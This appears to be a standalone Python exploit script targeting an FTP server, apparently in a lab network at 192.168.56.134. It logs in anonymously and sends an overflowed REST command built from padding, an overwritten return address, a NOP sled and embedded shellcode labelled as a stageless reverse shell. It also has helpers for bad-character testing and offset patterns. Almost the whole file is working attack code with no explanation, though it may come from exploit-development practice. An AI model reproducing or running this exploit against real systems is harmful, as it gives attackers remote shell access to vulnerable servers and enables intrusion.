import socket
import struct

def conv(address):
    return(struct.pack("<I", address))

def generate_badchar():
    badchar_test = b''
    badchars = [0x00, 0x0A, 0x0D]

    for i in range(0x00, 0xFF+1):
        if i not in badchars:
            badchar_test += struct.pack("B", i)

    with open("badchar_test.bin", "wb") as f:
        f.write(badchar_test)

    return(badchar_test)

def get_pattern():
    with open("pattern.txt", "rb") as f:
        return(f.read())

if __name__ == "__main__":
    IP = "192.168.56.134"
    PORT = 21
    RECV_SIZE = 1024
    OFFSET = 246

    StagelessReverseShellCode =  b""
    StagelessReverseShellCode += b"\xd9\xc5\xd9\x74\x24\xf4\xba"
    StagelessReverseShellCode += b"\xc4\x7a\x16\xb6\x5b\x31\xc9"
    StagelessReverseShellCode += b"\xb1\x52\x31\x53\x17\x03\x53"
    StagelessReverseShellCode += b"\x17\x83\x07\x7e\xf4\x43\x7b"
    StagelessReverseShellCode += b"\x97\x7a\xab\x83\x68\x1b\x25"
    StagelessReverseShellCode += b"\x66\x59\x1b\x51\xe3\xca\xab"
    StagelessReverseShellCode += b"\x11\xa1\xe6\x40\x77\x51\x7c"
    StagelessReverseShellCode += b"\x24\x50\x56\x35\x83\x86\x59"
    StagelessReverseShellCode += b"\xc6\xb8\xfb\xf8\x44\xc3\x2f"
    StagelessReverseShellCode += b"\xda\x75\x0c\x22\x1b\xb1\x71"
    StagelessReverseShellCode += b"\xcf\x49\x6a\xfd\x62\x7d\x1f"
    StagelessReverseShellCode += b"\x4b\xbf\xf6\x53\x5d\xc7\xeb"
    StagelessReverseShellCode += b"\x24\x5c\xe6\xba\x3f\x07\x28"
    StagelessReverseShellCode += b"\x3d\x93\x33\x61\x25\xf0\x7e"
    StagelessReverseShellCode += b"\x3b\xde\xc2\xf5\xba\x36\x1b"
    StagelessReverseShellCode += b"\xf5\x11\x77\x93\x04\x6b\xb0"
    StagelessReverseShellCode += b"\x14\xf7\x1e\xc8\x66\x8a\x18"
    StagelessReverseShellCode += b"\x0f\x14\x50\xac\x8b\xbe\x13"
    StagelessReverseShellCode += b"\x16\x77\x3e\xf7\xc1\xfc\x4c"
    StagelessReverseShellCode += b"\xbc\x86\x5a\x51\x43\x4a\xd1"
    StagelessReverseShellCode += b"\x6d\xc8\x6d\x35\xe4\x8a\x49"
    StagelessReverseShellCode += b"\x91\xac\x49\xf3\x80\x08\x3f"
    StagelessReverseShellCode += b"\x0c\xd2\xf2\xe0\xa8\x99\x1f"
    StagelessReverseShellCode += b"\xf4\xc0\xc0\x77\x39\xe9\xfa"
    StagelessReverseShellCode += b"\x87\x55\x7a\x89\xb5\xfa\xd0"
    StagelessReverseShellCode += b"\x05\xf6\x73\xff\xd2\xf9\xa9"
    StagelessReverseShellCode += b"\x47\x4c\x04\x52\xb8\x45\xc3"
    StagelessReverseShellCode += b"\x06\xe8\xfd\xe2\x26\x63\xfd"
    StagelessReverseShellCode += b"\x0b\xf3\x24\xad\xa3\xac\x84"
    StagelessReverseShellCode += b"\x1d\x04\x1d\x6d\x77\x8b\x42"
    StagelessReverseShellCode += b"\x8d\x78\x41\xeb\x24\x83\x02"
    StagelessReverseShellCode += b"\xd4\x11\xb3\xb8\xbc\x63\xc3"
    StagelessReverseShellCode += b"\x2d\x61\xed\x25\x27\x89\xbb"
    StagelessReverseShellCode += b"\xfe\xd0\x30\xe6\x74\x40\xbc"
    StagelessReverseShellCode += b"\x3c\xf1\x42\x36\xb3\x06\x0c"
    StagelessReverseShellCode += b"\xbf\xbe\x14\xf9\x4f\xf5\x46"
    StagelessReverseShellCode += b"\xac\x50\x23\xee\x32\xc2\xa8"
    StagelessReverseShellCode += b"\xee\x3d\xff\x66\xb9\x6a\x31"
    StagelessReverseShellCode += b"\x7f\x2f\x87\x68\x29\x4d\x5a"
    StagelessReverseShellCode += b"\xec\x12\xd5\x81\xcd\x9d\xd4"
    StagelessReverseShellCode += b"\x44\x69\xba\xc6\x90\x72\x86"
    StagelessReverseShellCode += b"\xb2\x4c\x25\x50\x6c\x2b\x9f"
    StagelessReverseShellCode += b"\x12\xc6\xe5\x4c\xfd\x8e\x70"
    StagelessReverseShellCode += b"\xbf\x3e\xc8\x7c\xea\xc8\x34"
    StagelessReverseShellCode += b"\xcc\x43\x8d\x4b\xe1\x03\x19"
    StagelessReverseShellCode += b"\x34\x1f\xb4\xe6\xef\x9b\xd4"
    StagelessReverseShellCode += b"\x04\x25\xd6\x7c\x91\xac\x5b"
    StagelessReverseShellCode += b"\xe1\x22\x1b\x9f\x1c\xa1\xa9"
    StagelessReverseShellCode += b"\x60\xdb\xb9\xd8\x65\xa7\x7d"
    StagelessReverseShellCode += b"\x31\x14\xb8\xeb\x35\x8b\xb9"
    StagelessReverseShellCode += b"\x39"

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP, PORT))

        recvData = sock.recv(RECV_SIZE).decode()
        print(recvData)

        sock.sendall(b"USER anonymous\r\n")
        recvData = sock.recv(RECV_SIZE).decode()
        print(recvData)

        sock.sendall(b"PASS anonymous\r\n")
        recvData = sock.recv(RECV_SIZE).decode()
        print(recvData)

        buf  = b''
        buf += b'A' * OFFSET
        buf += conv(0x768dcf7c)
        buf += b'\x90' * 32
        buf += StagelessReverseShellCode

        sock.sendall(b"REST " + buf + b"\r\n")
        recvData = sock.recv(RECV_SIZE).decode()
        print(recvData)
        sock.close()
    
    except Exception as err:
        print(f"Error : {err}")